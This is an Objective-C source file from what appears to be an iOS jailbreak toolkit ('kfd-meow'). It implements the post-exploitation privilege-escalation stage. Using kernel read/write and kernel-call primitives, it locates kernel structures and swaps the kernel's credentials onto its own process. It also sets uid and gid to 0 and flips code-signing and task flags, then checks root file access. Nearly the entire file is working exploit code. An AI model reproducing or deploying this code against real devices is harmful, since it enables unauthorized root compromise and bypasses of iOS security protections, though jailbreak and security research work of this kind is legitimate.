//
//  libmeow.m
//  kfd-meow
//
//  Created by doraaa on 2023/12/17.
//

#include "libmeow.h"

uint64_t kernel_base = 0;
uint64_t kernel_slide = 0;

uint64_t our_task = 0;
uint64_t our_proc = 0;
uint64_t kernel_task = 0;
uint64_t kernproc = 0;
uint64_t our_ucred = 0;
uint64_t kern_ucred = 0;

uint64_t gCpuTTEP = 0;
uint64_t gPhysBase = 0;
uint64_t gVirtBase = 0;

uint64_t data__gCpuTTEP = 0;
uint64_t data__gVirtBase = 0;
uint64_t data__gPhysBase = 0;

uint64_t add_x0_x0_0x40 = 0;
uint64_t proc_set_ucred = 0;
uint64_t container_init = 0;
uint64_t iogettargetand = 0;
uint64_t empty_kdata    = 0;

void set_offsets(void) {
    kernel_slide = get_kernel_slide();
    kernel_base = kernel_slide + KERNEL_BASE_ADDRESS;
    our_task = get_current_task();
    our_proc = get_current_proc();
    kernel_task = get_kernel_task();
    kernproc = get_kernel_proc();
    our_ucred = proc_get_ucred(our_proc);
    kern_ucred = proc_get_ucred(kernproc);
    
    printf("kernel_slide : %016llx\n", kernel_slide);
    printf("kernel_base  : %016llx\n", kernel_base);
    printf("our_task     : %016llx\n", our_task);
    printf("our_proc     : %016llx\n", our_proc);
    printf("kernel_task  : %016llx\n", kernel_task);
    printf("kernproc     : %016llx\n", kernproc);
    printf("our_ucred    : %016llx\n", our_ucred);
    printf("kern_ucred   : %016llx\n", kern_ucred);
}

/*---- proc ----*/
uint64_t proc_get_proc_ro(uint64_t proc_ptr) {
    if(@available(iOS 16.0, *))
        return kread64_kfd(proc_ptr + 0x18);
    return kread64_kfd(proc_ptr + 0x20);
}

uint64_t proc_ro_get_ucred(uint64_t proc_ro_ptr) {
    return kread64_kfd(proc_ro_ptr + 0x20);
}

uint64_t proc_get_ucred(uint64_t proc_ptr) {
    return proc_ro_get_ucred(proc_get_proc_ro(proc_ptr));
}

/*---- meow ----*/
int meow(void) {
    
    set_offsets();
    
    offsetfinder64_kread();
    if(init_kcall()) {
        printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
        uint64_t proc = get_current_proc();
        uint64_t task = get_current_task();
        uint64_t kernel_cred = proc_get_ucred(get_kernel_proc());
        eary_kcall(proc_set_ucred, proc, kernel_cred, 0, 0, 0, 0, 0);
        
        usleep(5000);
        kwrite32_kfd(off_p_uid + proc, 0);
        kwrite32_kfd(off_p_gid + proc, 0);
        kwrite32_kfd(off_p_ruid + proc, 0);
        kwrite32_kfd(off_p_rgid + proc, 0);
        
        uint32_t p_csflags = kread32_kfd(proc + off_p_csflags);
        p_csflags |= 0x14000000;
        kwrite32_kfd(proc + off_p_csflags, p_csflags);
        
        uint32_t t_flags = kread32_kfd(task + off_task_t_flags);
        t_flags |= 0x00000400;
        kwrite32_kfd(task + off_task_t_flags, t_flags);
        
        printf("getuid() : %d\n", getuid());
        printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
    }
    
    return 0;
}
